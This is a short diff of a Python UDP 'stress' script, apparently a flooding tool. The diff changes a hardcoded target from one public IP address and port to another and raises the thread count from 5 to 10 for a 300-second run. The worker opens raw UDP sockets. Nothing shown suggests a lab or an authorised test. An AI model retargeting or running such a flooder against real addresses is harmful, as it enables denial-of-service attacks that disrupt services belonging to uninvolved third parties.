@@ -3,10 +3,10 @@ import time
 import random
 import threading
 
-TARGET_IP = "89.46.1.130"
-TARGET_PORT = 7000
+TARGET_IP = "94.23.168.153"
+TARGET_PORT = 2343
 DURATION = 300  # مدة الاختبار بالثواني
-THREADS = 5
+THREADS = 10
 
 def smart_stress_worker(end_time):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
